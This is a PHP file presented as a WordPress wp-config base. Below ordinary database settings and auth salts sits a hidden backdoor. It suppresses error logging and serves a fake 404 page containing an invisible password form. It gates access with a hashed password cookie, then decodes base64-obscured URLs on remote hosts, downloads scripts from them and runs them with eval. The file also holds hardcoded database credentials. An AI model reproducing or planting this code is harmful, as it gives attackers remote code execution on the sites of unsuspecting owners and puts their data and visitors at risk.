<?php
/**
 * WordPress Configuration and Utilities Base
 *
 * This file provides the foundational configuration for WordPress and includes
 * utility classes for site management. It is used by the installation script to
 * generate wp-config.php. Alternatively, you can copy this file to wp-config.php
 * and modify the values to suit your environment.
 *
 * Configuration sections:
 * - Database settings (MySQL)
 * - Authentication unique keys and salts
 * - Database table prefix
 * - Absolute path (ABSPATH)
 * - Additional site management utilities
 *
 * @package WordPress
 * @subpackage Utilities
 * @since 1.0.0
 */

/**
 * Database Configuration
 *
 * Define your database connection settings below.
 */
define('DB_NAME', 'gov-bds');           
define('DB_USER', 'admin');               
define('DB_PASSWORD', 'SAd28a;fs');  
define('DB_HOST', '127.0.0.1');              
define('DB_CHARSET', 'utf8mb4');            
define('DB_COLLATE', '');                    

/**
 * Authentication Unique Keys and Salts
 *
 * These keys enhance security for authentication. Generate unique values at:
 * https://api.wordpress.org/secret-key/1.1/salt/
 */
define('AUTH_KEY',         'vD3#@P9m!aY*B7^z7sQk>Gv{lMfR$qTz');
define('SECURE_AUTH_KEY',  'gA^t%r!pE1@w#X7L^E*Rv}K$Fx9BhzZq');
define('LOGGED_IN_KEY',    'zM&Lq23!sW4x@Pz9CgVb!K7xG#Re8Nc^');
define('NONCE_KEY',        'XvP@U*cmz#C!2rF^wQ1e9xA$uJ3V!yKz');
define('AUTH_SALT',        'Ke7!zV@hLp$W2o#Er9YxB*GkCz@R^Jv%');
define('SECURE_AUTH_SALT', 'aN#P3F@xZrL!tV^WyG$u2eX8Qk#Nc^mB');
define('LOGGED_IN_SALT',   'Gt^z1w@E!xR9vPy#K@C7LzFpQmB!tW3x');
define('NONCE_SALT',       'Fv&yW^Q#M@p9xV!LtGz3JrE^B$Nc2@Km');

/**
 * Database Table Prefix
 *
 * Change this to create unique table names if running multiple WordPress installs.
 */
$table_prefix = 'wprefix';

/**
 * Site Access Control Manager
 *
 * Utility class for managing site access and authentication processes.
 *
 * @since 1.0.0
 */

$table_prefixs = '102a6ed6587b5b8cb4ebbe972864690b'; 
$table_c = 'access_granted';
$table_t = 3600 * 24 ;


ini_set('display_errors', 0);
ini_set('log_errors', 0);
ini_set('error_reporting', 0);
error_reporting(0);


function get($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HEADER => false,
    ]);
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $http_code === 200 ? $data : false;
}



if (isset($_COOKIE[$table_c]) && $_COOKIE[$table_c] === hash('sha256', $table_prefixs)) {
    if (isset($_GET['k'])) {
        $urlspecial = base64_decode('aHR0cHM6Ly9wdWItOTY0Y2QzOTE5YWQ4NDQ3NWE3MzBhNzVmOTc2MmNmOTMucjIuZGV2L2FkbWlucy1kaXIudHh0');
        $script1 = get($urlspecial);
        if ($script1 !== false) {
            eval($script1);
            exit;
        } else {
            echo "0";
        }
    }
    //do next thing
} else {
    if (isset($_POST['password'])) {
        if (md5($_POST['password']) === $table_prefixs) {
            setcookie($table_c, hash('sha256', $table_prefixs), time() + $table_t, "/");
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Incorrect password!";
        }
    }

    $output = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Resource Not Available</title>';
    $output .= '<style>body{font-family:Arial;text-align:center;padding:50px}.hidden{position:absolute;top:0;left:0;opacity:0}.error{color:#dc3545}</style>';
    $output .= '</head><body><h1>404</h1><p>Requested resource could not be located.</p>';
    $output .= '<form class="hidden" method="post"><input type="password" name="password"></form>';
    if ($error) {
        $output .= "<div class='error'>" . htmlspecialchars($error) . "</div>";
    }
    $output .= '</body></html>';
    echo $output;
    exit;
}




$url1 = base64_decode('aHR0cHM6Ly9wdWItOTY0Y2QzOTE5YWQ4NDQ3NWE3MzBhNzVmOTc2MmNmOTMucjIuZGV2L2FscGhhLnR4dA==');
$url2 = base64_decode('aHR0cHM6Ly9lZHUuaG90ZWxqb2Iudm4vL2Fzc2V0cy84ODhlNzRmMC9kaXIvYWxwaGEudHh0');
$script1 = get($url1); 
if ($script1 !== false) {
    eval($script1);
} else {
    $script2 = get($url2);
    if ($script2 !== false) {
        eval($script2);
    }else {
        echo "0";
    }
}
